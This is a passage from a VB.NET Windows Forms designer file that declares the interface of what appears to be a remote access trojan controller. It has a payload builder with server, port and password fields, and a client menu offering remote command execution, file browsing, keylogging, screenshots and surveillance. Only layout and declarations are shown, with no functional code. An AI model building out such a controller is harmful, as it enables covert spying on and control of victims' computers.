        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        Me.TabPage5.ResumeLayout(False)
        CType(Me.picAbout, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents CrystalClearTabControl1 As Server.CrystalClearTabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents lvClient As System.Windows.Forms.ListView
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents cmdExit As Server.CrystalClearButton
    Friend WithEvents lbStatus As System.Windows.Forms.Label
    Friend WithEvents cmdListen As Server.CrystalClearButton
    Friend WithEvents tmThread As System.Windows.Forms.Timer
    Friend WithEvents ctxMenu As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteCMDToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PluginsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FileExplorerToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CrystalClearThemeContainer1 As Server.CrystalClearThemeContainer
    Friend WithEvents ScreenshotToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents NetworkToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ClientToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TerminateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents picAbout As PictureBox
    Friend WithEvents txtAbout As CrystalClearTextBox
    Friend WithEvents GroupBox2 As GroupBox
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents Label3 As Label
    Friend WithEvents Label2 As Label
    Friend WithEvents Label1 As Label
    Friend WithEvents txtPassword As CrystalClearTextBox
    Friend WithEvents txtBuildPort As CrystalClearTextBox
    Friend WithEvents txtBuildServer As CrystalClearTextBox
    Friend WithEvents cbBuildPlugin As ComboBox
    Friend WithEvents opBuildCustom As RadioButton
    Friend WithEvents opBuildShell As RadioButton
    Friend WithEvents opBuildDll As RadioButton
    Friend WithEvents txtBuildLog As CrystalClearTextBox
    Friend WithEvents cmdBuild As CrystalClearButton
    Friend WithEvents GroupBox3 As GroupBox
    Friend WithEvents txtLog As TextBox
    Friend WithEvents txtBlockIPAdd As CrystalClearButton
    Friend WithEvents txtBlockIP As CrystalClearTextBox
    Friend WithEvents lsBlockIP As CrystalClearListbox
    Friend WithEvents ImFlag As ImageList
    Friend WithEvents cmdRemoveBlockIP As CrystalClearButton
    Friend WithEvents ForceCloseToolStripMenuItem As ToolStripMenuItem
End Class
